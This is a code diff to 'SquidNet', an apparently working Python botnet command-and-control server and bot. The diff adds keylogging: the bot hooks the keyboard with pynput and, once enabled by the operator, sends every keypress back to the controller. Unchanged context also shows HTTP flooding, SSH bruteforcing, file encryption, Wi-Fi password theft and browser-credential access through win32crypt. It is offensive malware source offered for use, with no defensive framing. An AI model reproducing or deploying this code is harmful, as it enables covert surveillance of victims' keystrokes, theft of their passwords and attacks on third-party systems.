@@ -212,6 +212,7 @@ class Botnet:
         self.listener.start()
         self.logo()
         self.savefile = False
+        self.displaykeys = False
         self.welcomemsg = """
 [(SERVER)]: 
 [+] List of Commands:
@@ -236,6 +237,8 @@ class Botnet:
 [+] !mkfile [filename]                   - Creates a file in the bot working directory.
 [+] !editfile [file]                     - Opens a file in writing mode for the bots.
 [+] !stopedit                            - Closes file editor on bots and returns to normal.
+[+] !keylog [display?]                   - Sets up keylogging on the bots(put True in 2nd arg to display it, put nothing to not).
+[+] !stopkeylog                          - Stops any keylogging on the Botnet.
 [+] !encdir                              - Encrypts all files in the bot working directory
 [+] !decdir                              - Decrypts all files in the bot working directory
 [+] !botcount                            - Gets the amount of connected bots.
@@ -276,14 +279,14 @@ class Botnet:
     def log_logo(self):
         """Logo of this script."""
         logo = """
-  _____             _     _ _   _      _         ______ ___  
- / ____|           (_)   | | \ | |    | |       |____  / _ \ 
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __ / / | | |
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / // /| | | |
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V // / | |_| |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_//_(_) \___/ 
-           | |                                               
-           |_|                                                                                                                                                                          
+  _____             _     _ _   _      _         ______ __ 
+ / ____|           (_)   | | \ | |    | |       |____  /_ |
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __ / / | |
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / // /  | |
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V // /   | |
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_//_(_)  |_|
+           | |                                             
+           |_|                                                                                                                                                       
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
@@ -317,6 +320,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         print("[+] !mkfile [filename]                   - Creates a file in the bot working directory.")
         print("[+] !editfile [file]                     - Opens a file in writing mode for the bots.")
         print("[+] !stopedit                            - Closes file editor on bots and returns to normal.")
+        print("[+] !keylog [display?]                   - Sets up keylogging on the bots(put True in 2nd arg to display it, put nothing to not).")
+        print("[+] !stopkeylog                          - Stops any keylogging on the Botnet.")
         print("[+] !encdir                              - Encrypts all files in the bot working directory")
         print("[+] !decdir                              - Decrypts all files in the bot working directory")
         print("[+] !botcount                            - Gets the amount of connected bots.")
@@ -556,6 +561,17 @@ ________________________________________________________
                                         self.log(f"\n[(ERROR)]: {str(e)}")
                                 c.close()
                                 break
+                        elif msg.startswith("!sendkey"):
+                            msg_split = msg.split()
+                            del msg_split[0]
+                            main_msg = ""
+                            for i in msg_split:
+                                main_msg = main_msg + " " + i
+                            main_msg = main_msg.strip()
+                            logthis = f"[({hostname})]: {main_msg}"
+                            self.log(logthis)
+                            if self.displaykeys:
+                                print(logthis)
                     if admin:
                         if msg.startswith('!httpflood'):
                             msgtobot = msg.split()
@@ -618,6 +634,16 @@ ________________________________________________________
                             else:
                                 c.send("[(SERVER)]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!".encode())
                                 self.log(f"\n[(SERVER)---->({hostname})]: Botnet is configured without ssh bruteforcing. Cannot bruteforce!")
+                        elif msg.startswith("!keylog"):
+                            msg_split = msg.split()
+                            try:
+                                self.displaykeys = bool(msg_split[1])
+                            except:
+                                self.displaykeys = False
+                            self.log("\n[(SERVER)]: Started Keylogging on the bots.")
+                            c.send(f"[(SERVER)]: Set displaying Key-inputs to the server to: {self.displaykeys}".encode())
+                        elif msg.startswith("!stopkeylog"):
+                            self.log("\n[(SERVER)]: Stopped Keylogging on the bots.")
                         elif msg.startswith("!sshlogin"):
                             msg_split = msg.split()
                             ip = msg_split[1]
@@ -687,7 +713,8 @@ ________________________________________________________
                         try:
                             msgtoadmin = f"[({hostname})]: {msg.strip()}"
                             self.log("\n" + msgtoadmin)
-                            print("\n" + msgtoadmin)
+                            if not msg.startswith("!sendkey"):
+                                print("\n" + msgtoadmin)
                         except Exception as e:
                             self.log(f"\n[(ERROR)]: {e}")
                         for adminconn in self.admin_conn:
@@ -945,6 +972,16 @@ ________________________________________________________
                         injector.start()
                 elif self.instruction.startswith("!listsshbots"):
                     print(f"[+] Connected SSH Bots: {self.display_bots}")
+                elif self.instruction.startswith("!keylog"):
+                    msg_split = self.instruction.split()
+                    try:
+                        self.displaykeys = bool(msg_split[1])
+                    except:
+                        self.displaykeys = False
+                    print(f"[+] Setting Display key-inputs to output to: {self.displaykeys}.")
+                    self.log("\n[(SERVER)]: Started Keylogging on the bots.")
+                elif self.instruction.startswith("!stopkeylog"):
+                    self.log("\n[(SERVER)]: Stopped Keylogging on the bots.")
                 elif self.instruction.startswith("!sshlogin"):
                     msg_split = self.instruction.split()
                     ip = msg_split[1]
@@ -1006,6 +1043,7 @@ ________________________________________________________
 [+] - Made it so that '!clear', '!genscript' and '!genadminscript' are not sent to the clients.
 [+] - Fixed typos.
 [+] - Added '!kick' and '!togglelisten'
+[+] - Added Keylogging to the bots.
 [+] - Added display message when there is an error with binding the server.
                     """)
                 if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip() or "!getconninfo" in self.instruction.strip() or "listsshbots" in self.instruction.strip() or "!togglelisten" in self.instruction.strip():
@@ -1123,6 +1161,10 @@ admin = BotMaster('""" + self.ngroklink + """',""" + str(
 #-----SquidNet-Bot-Script-----#
 import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json
 import subprocess, re
+try:
+    from pynput.keyboard import Listener # pip install pynput
+except:
+    pass
 try:
     import win32crypt # pip install pypiwin32
 except:
@@ -4470,6 +4512,7 @@ class Bot:
         self.port = port
         self.msg = ""
         self.desktop = f"C:/Users/{os.getlogin()}/Desktop"
+        self.logging = False
         self.file_saving = False
         while True:
             try:
@@ -4479,6 +4522,11 @@ class Bot:
             except:
                 self.connection.close()
                 time.sleep(1)
+        try:
+            logger = threading.Thread(target=self.start_logging)
+            logger.start()
+        except:
+            pass
         self.fileeditor = False
         time.sleep(1)
         msg = socket.gethostname()+" "+self.getip()+" "+os.getlogin()+" "+sys.platform
@@ -4524,6 +4572,17 @@ class Bot:
                 self.run_cmd()
             except:
                 pass
+    def on_press(self, key):
+        if self.logging:
+            try:
+                self.send("!sendkey " + str(key))
+            except:
+                pass
+    def on_release(self, key):
+        pass
+    def start_logging(self):
+        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+            listener.join()
     def obtainwifipass(self):
         if sys.platform == "darwin":
             self.send("This bot is on a Apple-based product. Unable to get wifi passwords!")
@@ -4695,6 +4754,11 @@ OS:       {sys.platform}
                         self.send("!CLIENTLOG".encode())
                         time.sleep(1)
                         connected = True
+                        try:
+                            logger = threading.Thread(target=self.start_logging)
+                            logger.start()
+                        except:
+                            pass
                         break
                     except:
                         pass
@@ -4902,6 +4966,16 @@ OS:       {sys.platform}
                     self.send(msgtoserv)
                 elif self.msg.startswith('!getip'):
                     self.send(self.getip())
+                elif self.msg.startswith("!keylog"):
+                    if self.logging:
+                        pass
+                    else:
+                        self.send("Started to send keyboard inputs.")
+                        self.logging = True
+                elif self.msg.startswith("!stopkeylog"):
+                    if self.logging:
+                        self.send("Stopped Keylogging.")
+                    self.logging = False
                 elif self.msg.startswith('!getwifi'):
                     wifi_passwords = self.obtainwifipass()
                     self.send(wifi_passwords)
